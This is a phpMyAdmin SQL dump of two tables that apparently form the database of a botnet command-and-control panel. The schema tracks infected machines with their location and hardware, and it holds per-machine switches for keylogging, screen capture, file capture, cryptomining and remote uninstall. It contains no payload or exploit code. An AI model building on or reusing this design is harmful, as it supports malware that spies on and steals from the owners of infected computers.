-- phpMyAdmin SQL Dump
-- version 4.1.7
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Oct 27, 2018 at 06:43 PM
-- Server version: 5.6.33-log
-- PHP Version: 5.3.10

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `my_database`
--

-- --------------------------------------------------------

--
-- Table structure for table `botnet`
--

CREATE TABLE IF NOT EXISTS `botnet` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `machineID` varchar(64) NOT NULL,
  `password` varchar(64) NOT NULL,
  `system` tinytext NOT NULL,
  `programVersion` tinytext NOT NULL,
  `latitude` double NOT NULL,
  `longitude` double NOT NULL,
  `ordersInterval` int(11) NOT NULL DEFAULT '60',
  `inspectHardware` tinyint(1) NOT NULL DEFAULT '0',
  `inspectFiles` tinyint(1) NOT NULL DEFAULT '0',
  `interestingFiles` mediumtext,
  `keylogger` tinyint(1) NOT NULL DEFAULT '0',
  `screenCapture` tinyint(1) NOT NULL DEFAULT '0',
  `screenCaptureInterval` int(11) NOT NULL DEFAULT '30',
  `filesCapture` tinyint(1) NOT NULL DEFAULT '0',
  `mining` tinyint(1) NOT NULL DEFAULT '0',
  `uninstall` tinyint(1) NOT NULL DEFAULT '0',
  `first_signal` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `last_signal` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `note` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=113 ;

-- --------------------------------------------------------

--
-- Table structure for table `specs`
--

CREATE TABLE IF NOT EXISTS `specs` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `machineID` varchar(64) CHARACTER SET utf8 NOT NULL,
  `account` text CHARACTER SET utf8 NOT NULL,
  `os` text CHARACTER SET utf8 NOT NULL,
  `language` text CHARACTER SET utf8 NOT NULL,
  `motherboard` text CHARACTER SET utf8 NOT NULL,
  `memory` text CHARACTER SET utf8 NOT NULL,
  `bios` text CHARACTER SET utf8 NOT NULL,
  `cpu` text CHARACTER SET utf8 NOT NULL,
  `gpu` text CHARACTER SET utf8 NOT NULL,
  `audio` text CHARACTER SET utf8 NOT NULL,
  `network` text CHARACTER SET utf8 NOT NULL,
  `harddrives` text CHARACTER SET utf8 NOT NULL,
  `cdrom` text CHARACTER SET utf8 NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COLLATE=utf8_bin AUTO_INCREMENT=113 ;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
